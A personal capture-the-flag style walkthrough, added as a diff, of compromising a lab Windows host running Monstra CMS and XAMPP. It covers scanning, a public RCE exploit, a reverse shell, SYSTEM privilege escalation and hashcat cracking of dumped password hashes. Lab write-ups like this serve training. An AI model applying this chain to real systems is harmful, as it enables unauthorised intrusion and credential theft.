@@ -1,0 +1,175 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.241.180 > Monster.txt
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
+|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: Mike Wazowski
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Mike Wazowski
+|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:     a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
+| SHA-1:   b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
+|_SHA-256: 0169 7338 0c0f 1df0 0bd9 593e d8d5 efa3 706c d6df 7993 f614 1272 b805 22ac dd23
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-05-10T04:53:29+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: MIKE-PC
+|   NetBIOS_Domain_Name: MIKE-PC
+|   NetBIOS_Computer_Name: MIKE-PC
+|   DNS_Domain_Name: Mike-PC
+|   DNS_Computer_Name: Mike-PC
+|   Product_Version: 10.0.19041
+|_  System_Time: 2026-05-10T04:53:14+00:00
+| ssl-cert: Subject: commonName=Mike-PC
+| Issuer: commonName=Mike-PC
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-05-09T04:49:30
+| Not valid after:  2026-11-08T04:49:30
+| MD5:     585d 54af 6d0e b43b 6724 3cc4 72cd 3ab3
+| SHA-1:   e601 2e78 4f11 0352 dd60 79e3 a0cd 5940 d837 0159
+|_SHA-256: 8cae fc3c c0d2 9e12 a69b c449 680a 0d67 df23 7f1b 06e0 9584 2418 d31b d955 871f
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-05-10T04:53:16
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+
+sudo nano /etc/hosts
+add monster.pg 
+
+$ gobuster dir -u http://192.168.241.180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+
+Found a webpage https://monster.pg/blog/ shows Powered by Monstra 3.0.4
+Search and found CVE-2018-9038 Monstra CMS 3.0.4 - Remote Code Execution (RCE)
+
+search monstra 3.0.4 default password. get admin:wazowski.
+Login to https://monster.pg/blog/admin with this credential.
+
+download https://www.exploit-db.com/exploits/52038
+After modify script, adjust indentation and line format.
+$ python3 52038.py http://monster.pg/blog admin wazowski
+Logging in...
+Login successful
+Preparing shell...
+Your shell is ready: http://monster.pg/blog/public/themes/default/6r35w.chunk.php
+Get a webshell with mike-pc\mike.
+Input reshell PowerShell #2
+
+Get a reverse shell.
+
+
+In website http://monster.pg/blog/admin/index.php?id=information Found:
+The Monstra .htaccess file has been found to be writable. We would advise you to remove all write permissions.
+You can do this on unix systems with: chmod a-w C:\xampp\htdocs\blog\.htaccess
+! 	The Monstra index.php file has been found to be writable. We would advise you to remove all write permissions.
+You can do this on unix systems with: chmod a-w C:\xampp\htdocs\blog\index.php
+PS C:\xampp\htdocs\blog> icacls index.php
+index.php BUILTIN\Administrators:(I)(F)
+          NT AUTHORITY\SYSTEM:(I)(F)
+          BUILTIN\Users:(I)(RX)
+          NT AUTHORITY\Authenticated Users:(I)(M)
+Successfully processed 1 files; Failed processing 0 files
+PS C:\xampp\htdocs\blog> Get-ACL index.php
+    Directory: C:\xampp\htdocs\blog
+Path      Owner                  Access                                                                                
+----      -----                  ------                                                                                
+index.php BUILTIN\Administrators BUILTIN\Administrators Allow  FullControl...
+Found the index.php is own by Administrators and mike can modify it.
+
+cat C:\xampp\properties.ini
+Found XAMPP version 7.3.10
+─$ searchsploit XAMPP
+XAMPP 7.4.3 - Local Privilege Escalation                   | windows/local/50337.ps1
+
+Follow 50337.ps1, upload msf.exe and invoke get a SYSTEM reverse shell 
+$ rlwrap nc -nlvp 4445
+listening on [any] 4445 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.241.180] 53888
+Microsoft Windows [Version 10.0.19044.1645]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+whoami
+mike-pc\administrator
+
+################################################################################
+Method 2: 
+In Monstra protal. Go System Backups, can create a new backup then download to Kali. From the backups, found in xampp/htdocs/blog/storage/database/users.xml
+admin:a2b4e80cd640aaa6e417febe095dcbfc:jJkdUX1FOFiI
+
+<login>mike</login>
+<password>844ffc2c7150b93c4133a6ff2e1a2dba</password>
+<email>mike@monster.pg</email>
+<hash>8vPjvUPDHhRp</hash>
+844ffc2c7150b93c4133a6ff2e1a2dba:8vPjvUPDHhRp
+
+cat C:\xampp\htdocs\blog\boot\defines.php found
+/**
+ * Set password salt
+ */
+define('MONSTRA_PASSWORD_SALT', 'YOUR_SALT_HERE');
+
+cat C:\xampp\htdocs\blog\engine\Security.php
+/**
+     * Encrypt password
+     *
+     *  <code>
+     *      $encrypt_password = Security::encryptPassword('password');
+     *  </code>
+     *
+     * @param string $password Password to encrypt
+     */
+    public static function encryptPassword($password)
+    {
+        return md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));
+    }
+
+
+based on this info, can create a rule file, and use -m 2600 as it is double MD5 hash.
+echo "$Y $O $U $R $\x5F $S $A $L $T $\x5F $H $E $R $E" > monsterrule
+echo "844ffc2c7150b93c4133a6ff2e1a2dba" > hash.txt
+hashcat -m 2600 hash.txt — wordlist rockyou.txt -r monsterrule
+Cracked Mike:Mike14
+Then can rdp in. 
+
+###############################################################################
+
+For XAMPP Local PrivEsc, can refer to https://github.com/S1lkys/CVE-2020-11107
+Version: XAMPP < 7.2.29, 7.3.x < 7.3.16 & 7.4.x < 7.4.4
+
+
+
+ 
